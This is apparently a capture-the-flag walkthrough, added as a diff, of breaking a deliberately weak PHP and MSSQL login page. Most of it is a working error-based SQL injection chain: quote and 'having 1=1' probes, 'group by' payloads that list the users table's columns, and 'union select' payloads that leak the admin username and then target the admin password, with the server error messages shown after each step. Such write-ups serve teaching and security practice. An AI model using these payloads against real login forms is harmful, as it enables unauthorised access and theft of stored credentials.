@@ -1,0 +1,34 @@
+This time Drake invented another secure PHP and MSSQL login. But he once again failed to secure it...
+
+so i tried to login as admin:admin and got error 
+then i change the name to ' and password to any string and got a server error:
+    Microsoft OLE DB Provider for SQL Server error '80040e14'
+    Unclosed quotation mark before the character string '' and password = ''.
+    /secure.php, line 666
+
+then i inserted ' having 1=1--
+    Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
+    [Microsoft][ODBC SQL Server Driver][SQL Server]Column 'users.id' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.
+    /secure.php, line 666+
+
+so now i have ' group by users.id having 1=1--
+got to see another column users.username
+
+so now ' group by users.id, users.username having 1=1--
+now we saw users.password so in next we have
+' group by users.id, users.username, users.password having 1=1--
+
+
+next we have users.privID
+' group by users.id, users.username, users.password, users.privID having 1=1--
+after inserting this we didn't get error by server but by the db that this username and password were not in
+the db.....this means no there are no more column
+
+so now
+' union select min(username),1,1,1 from users where username > 'a'--
+we get:
+    Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
+    [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value 'admin' to a column of data type int. /secure.php, line 666
+
+therefore now we finally have
+' union select password,1,1,1 from users where username = 'admin'--
